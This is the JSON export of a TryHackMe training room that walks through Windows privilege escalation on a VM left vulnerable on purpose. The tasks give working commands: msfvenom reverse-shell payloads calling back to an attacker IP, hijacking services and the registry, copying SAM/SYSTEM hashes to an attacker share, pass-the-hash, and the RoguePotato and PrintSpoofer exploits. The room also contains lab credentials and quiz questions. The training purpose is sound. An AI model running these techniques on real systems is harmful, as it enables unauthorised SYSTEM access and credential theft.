{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/380988091a148cb77d399cf3c577f6da.jpeg', 'title': 'Windows PrivEsc', 'description': 'Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321', 'code': 'windows10privesc', 'users': 22383, 'tags': ['privesc', 'privilege escalation', 'windows', 'windows privilege escalation', 'tib3rius'], 'type': 'walkthrough', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 1043, 'created': '2020-06-23T19:54:37.180Z', 'published': '2020-06-23T18:34:17.988Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://i.imgur.com/2dmv1BY.png', 'creator': 'Tib3rius', 'tasks': [{'taskTitle': 'Deploy the Vulnerable Windows VM', 'taskDesc': '<p>This room is aimed at walking you through a variety of Windows Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Windows VM. This VM was created by\xa0<span style="font-size:1rem;color:rgb(33, 37, 41)">Sagi Shahar as part of his\xa0<a href="https://github.com/sagishahar/lpeworkshop" target="_blank">local privilege escalation workshop</a>\xa0but has been updated by\xa0<a href="https://twitter.com/TibSec" target="_blank">Tib3rius</a>\xa0as part of his\xa0</span><a href="https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574" target="_blank">Windows Privilege Escalation for OSCP and Beyond!</a><span style="font-size:1rem;color:rgb(33, 37, 41)">\xa0course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Windows.</span></p><p><span style="font-weight:bolder">Make sure you are connected to the\xa0<a href="https://tryhackme.com/access" target="_blank">TryHackMe VPN</a>\xa0or using the in-browser Kali instance before trying to access the Windows VM!</span></p><p>RDP should be available on port 3389 (it may take a few minutes for the service to start). You can login to the "user" account using the password<span style="font-size:1rem">\xa0"</span><span style="font-size:1rem;font-weight:bolder">password321</span><span style="font-size:1rem">":</span></p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0)">xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP</code><br /></p><p>The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a admin or SYSTEM shell.\xa0<span style="font-weight:bolder">Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!</span></p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2020-06-08T02:54:45.946Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5f3d92b542e1ab8a6d922999', 'questions': [{'questionNo': 1, 'question': 'Deploy the Windows VM and login using the "user" account.', 'hint': ''}]}, {'taskTitle': 'Generate a Reverse Shell Executable', 'taskDesc': '<p>On Kali, generate a reverse shell executable (reverse.exe) using msfvenom.\xa0<span style="font-size:1rem;">Update the LHOST IP address accordingly:</span></p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe</code></p><p>Transfer the reverse.exe file to the C:\\PrivEsc\xa0directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.</p><p>On Kali, in the same directory as reverse.exe:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .</code></p><p>On Windows (update the IP address with your Kali IP):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">copy \\\\10.10.10.10\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe</code></p><p>Test the reverse shell by setting up a netcat listener on Kali:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sudo nc -nvlp 53</code><span style="color:rgb(0, 255, 0);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;background-color:rgb(0, 0, 0);"></span></p><p>Then run the reverse.exe executable on Windows and catch the shell:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\reverse.exe</code></p><p>The reverse.exe executable will be used in many of the tasks in this room, so don\'t delete it!</p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2020-06-17T01:50:21.662Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!', 'hint': ''}]}, {'taskTitle': 'Service Exploits - Insecure Service Permissions', 'taskDesc': '<p>Use accesschk.exe to check the "user" account\'s permissions on the "daclsvc" service:</p><p><code style="background-color:rgb(0, 0, 0);color:rgb(0, 255, 0);">C:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user daclsvc</code></p><p>Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).</p><p>Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sc qc daclsvc</code></p><p>Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sc config daclsvc binpath= "\\"C:\\PrivEsc\\reverse.exe\\""</code></p><p>Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">net start daclsvc</code></p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2020-06-17T02:42:18.378Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the original BINARY_PATH_NAME of the daclsvc service?', 'hint': ''}]}, {'taskTitle': 'Service Exploits - Unquoted Service Path', 'taskDesc': '<p><span style="font-size:1rem;">Query the "</span>unquotedsvc"<span style="font-size:1rem;">\xa0service and no</span><span style="font-size:1rem;">te that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces</span><span style="font-size:1rem;">.</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sc qc unquotedsvc</code></p><p><span style="font-size:1rem;">Using accesschk.exe, note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\\ directory:</span><br /></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\Unquoted Path Service\\"\n</code></p><p>Copy the\xa0<span style="font-size:1rem;">reverse.exe executable you created to this directory and rename it Common.exe:</span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">copy C:\\PrivEsc\\reverse.exe\xa0"C:\\Program Files\\Unquoted Path Service\\Common.exe"</code><span style="font-size:1rem;"></span></p><p>Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">net start unquotedsvc</code></p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2020-06-17T03:13:10.357Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the BINARY_PATH_NAME of the unquotedsvc service?', 'hint': ''}]}, {'taskTitle': 'Service Exploits - Weak Registry Permissions', 'taskDesc': '<p><span style="font-size:1rem;">Query the "</span>regsvc"<span style="font-size:1rem;">\xa0service and no</span><span style="font-size:1rem;">te that it runs with SYSTEM privileges (SERVICE_START_NAME)</span><span style="font-size:1rem;">.</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sc qc regsvc</code></p><p><span style="font-size:1rem;">Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT\xa0</span>AUTHORITY\\INTERACTIVE" group (essentially all logged-on users)<span style="font-size:1rem;">:</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc</code></p><p><span style="font-size:1rem;">Overwrite the ImagePath registry key to point to the reverse.exe executable you created:</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f</code><span style="font-size:1rem;"></span></p><p>Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">net start regsvc</code></p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2020-06-17T23:55:13.006Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Service Exploits - Insecure Service Executables', 'taskDesc': '<p><span style="font-size:1rem;">Query the "</span>filepermsvc"<span style="font-size:1rem;">\xa0service and no</span><span style="font-size:1rem;">te that it runs with SYSTEM privileges (SERVICE_START_NAME)</span><span style="font-size:1rem;">.</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sc qc filepermsvc</code></p><p><span style="font-size:1rem;">Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone</span><span style="font-size:1rem;">:</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\accesschk.exe /accepteula -quvw "C:\\Program Files\\File Permissions Service\\filepermservice.exe"</code></p><p><span style="font-size:1rem;">Copy the reverse.exe executable you created and replace the filepermservice.exe with it:</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">copy C:\\PrivEsc\\reverse.exe "C:\\Program Files\\File Permissions Service\\filepermservice.exe" /Y</code><span style="font-size:1rem;"></span></p><p>Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">net start filepermsvc</code></p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2020-06-18T00:05:56.820Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Registry - AutoRuns', 'taskDesc': '<p>Query the registry for AutoRun executables:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code></p><p>Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">C:\\PrivEsc\\accesschk.exe /accepteula -wvu "C:\\Program Files\\Autorun Program\\program.exe"</code></p><p><span style="font-size:1rem">Copy the reverse.exe executable you created and overwrite the AutoRun executable\xa0</span><span style="font-size:1rem">with it:</span></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">copy C:\\PrivEsc\\reverse.exe "C:\\Program Files\\Autorun Program\\program.exe" /Y</code><span style="font-size:1rem"></span></p><p>Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!<br /></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">rdesktop MACHINE_IP</code></p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2020-06-18T00:14:57.027Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Registry - AlwaysInstallElevated', 'taskDesc': '<p>Query the registry for AlwaysInstallElevated keys:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated<br />reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</code></p><p>Note that both keys are set to 1 (0x1).</p><p>On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom.\xa0<span style="font-size:1rem;">Update the LHOST IP address accordingly:</span><br /></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi</code></p><p><span style="font-size:1rem;">Transfer the reverse.msi file to the C:\\PrivEsc\xa0directory on Windows (use the SMB server method from earlier).</span></p><p><span style="font-size:1rem;">Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:</span><br /></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">msiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi</code></p>', 'taskType': 'none', 'taskNo': 8, 'taskCreated': '2020-06-18T01:56:44.823Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Passwords - Registry', 'taskDesc': '<p>(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: <span style="background-color:rgb(0, 0, 0)">password123</span>)<br /></p><p>The registry can be searched for keys and values that contain the word "password":</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">reg query HKLM /f password /t REG_SZ /s</code></p><p>If you want to save some time, query this specific key to find admin AutoLogon credentials:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">reg query "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"</code></p><p>On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">winexe -U \'admin%password\' //MACHINE_IP cmd.exe</code><br /></p>', 'taskType': 'none', 'taskNo': 9, 'taskCreated': '2020-06-18T02:11:23.118Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What was the admin password you found in the registry?', 'hint': ''}]}, {'taskTitle': 'Passwords - Saved Creds', 'taskDesc': '<p>List any saved credentials:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">cmdkey /list</code></p><p>Note that credentials for the "admin" user are saved. If they aren\'t, run the C:\\PrivEsc\\savecred.bat\xa0script to refresh the saved credentials.</p><p>Start a listener on Kali and run the reverse.exe executable using runas with the admin user\'s saved credentials:</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">runas /savecred /user:admin C:\\PrivEsc\\reverse.exe</code></p>', 'taskType': 'none', 'taskNo': 10, 'taskCreated': '2020-06-18T02:18:55.551Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Passwords - Security Account Manager (SAM)', 'taskDesc': '<p>The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored b<span style="font-size:1rem">ackups of the SAM and SYSTEM files in the\xa0</span>C:\\Windows\\Repair\\\xa0directory.</p><p>Transfer the SAM and SYSTEM files to your Kali VM:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">copy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\<br />copy C:\\Windows\\Repair\\SYSTEM \\\\10.10.10.10\\kali\\</code></p><p>On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:</p><p><code style="background-color:rgb(0, 0, 0)"><span style="color:rgb(0, 255, 0)">git clone https://github.com/Tib3rius/creddump7</span><br /><span style="color:rgb(0, 255, 0)">pip3 install pycrypto</span><br /><span style="color:rgb(0, 255, 0)">python3 creddump7/pwdump.py SYSTEM SAM</span></code></p><p>Crack the admin NTLM hash using hashcat:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0)">hashcat -m 1000 --force &lt;hash&gt; /usr/share/wordlists/rockyou.txt</code></p><p>You can use the cracked password to log in as the admin using winexe or RDP.</p>', 'taskType': 'none', 'taskNo': 11, 'taskCreated': '2020-06-18T02:30:34.120Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the NTLM hash of the admin user?', 'hint': 'The hashdump includes the LM and NTLM hashes. The NTLM hash is the second one!'}]}, {'taskTitle': 'Passwords - Passing the Hash', 'taskDesc': '<p>Why crack a password hash when you can authenticate using the hash?</p><p>Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">pth-winexe -U \'admin%hash\' //MACHINE_IP cmd.exe</code><br /></p>', 'taskType': 'none', 'taskNo': 12, 'taskCreated': '2020-06-18T05:23:44.066Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Scheduled Tasks', 'taskDesc': '<p>View the contents of the C:\\DevTools\\CleanUp.ps1\xa0script:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">type C:\\DevTools\\CleanUp.ps1</code></p><p>The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\accesschk.exe /accepteula -quvw user C:\\DevTools\\CleanUp.ps1</code></p><p>Start a listener on Kali and then append a line to the <a>C:\\DevTools\\CleanUp.ps1</a>\xa0which runs the reverse.exe executable you created:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">echo C:\\PrivEsc\\reverse.exe &gt;&gt; C:\\DevTools\\CleanUp.ps1</code></p><p>Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.</p>', 'taskType': 'none', 'taskNo': 13, 'taskCreated': '2020-06-18T05:39:08.159Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Insecure GUI Apps', 'taskDesc': '<p>Start an RDP session as the "user" account:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">rdesktop -u user -p password321 MACHINE_IP</code></p><p>Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">tasklist /V | findstr mspaint.exe</code></p><p>In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste:\xa0file://c:/windows/system32/cmd.exe</p><p>Press Enter to spawn a command prompt running with admin privileges.</p>', 'taskType': 'none', 'taskNo': 14, 'taskCreated': '2020-06-18T05:44:15.803Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Startup Apps', 'taskDesc': '<p>Using accesschk.exe, note that the BUILTIN\\Users group can write files to the StartUp directory:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\accesschk.exe /accepteula -d "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"</code><span style="font-size:1rem;"></span></p><p>Using cscript, run the\xa0C:\\PrivEsc\\CreateShortcut.vbs<span style="font-size:1rem;">\xa0script which should create a new shortcut to your reverse.exe executable in the StartUp directory:</span></p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">cscript C:\\PrivEsc\\CreateShortcut.vbs</code></p><p>Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">rdesktop -u admin MACHINE_IP</code></p><p>A shell running as admin should connect back to your listener.</p>', 'taskType': 'none', 'taskNo': 15, 'taskCreated': '2020-06-18T05:49:27.918Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Token Impersonation - Rogue Potato', 'taskDesc': '<p>Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999</code></p><p>Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -&gt; run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\PSExec64.exe -i -u "nt authority\\local service" C:\\PrivEsc\\reverse.exe</code></p><p>Start another listener on Kali.</p><p>Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):</p><p><code style="color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\RoguePotato.exe -r 10.10.10.10 -e "C:\\PrivEsc\\reverse.exe" -l 9999</code></p>', 'taskType': 'none', 'taskNo': 16, 'taskCreated': '2020-06-18T05:55:34.566Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Name one user privilege that allows this exploit to work.', 'hint': 'Read up on the exploit on Google! This privilege relates to impersonation.'}, {'questionNo': 2, 'question': '<p>Name the other user privilege that allows this exploit to work.</p>', 'hint': 'Read up on the exploit on Google! This privilege relations to tokens.'}]}, {'taskTitle': 'Token Impersonation - PrintSpoofer', 'taskDesc': '<p><span style="font-size:1rem;">Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -&gt; run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:</span><br /></p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\PSExec64.exe -i -u "nt authority\\local service" C:\\PrivEsc\\reverse.exe</code></p><p>Start another listener on Kali.</p><p>Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):</p><p><code style="font-size:14px;color:rgb(0, 255, 0);background-color:rgb(0, 0, 0);">C:\\PrivEsc\\PrintSpoofer.exe -c "C:\\PrivEsc\\reverse.exe" -i</code></p>', 'taskType': 'none', 'taskNo': 17, 'taskCreated': '2020-06-18T06:07:09.425Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Read and follow along with the above.', 'hint': ''}]}, {'taskTitle': 'Privilege Escalation Scripts', 'taskDesc': '<p>Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\\PrivEsc\xa0directory:</p><p>winPEASany.exe</p><p>Seatbelt.exe</p><p>PowerUp.ps1</p><p>SharpUp.exe</p>', 'taskType': 'none', 'taskNo': 18, 'taskCreated': '2020-06-18T06:19:56.450Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room?', 'hint': ''}]}]}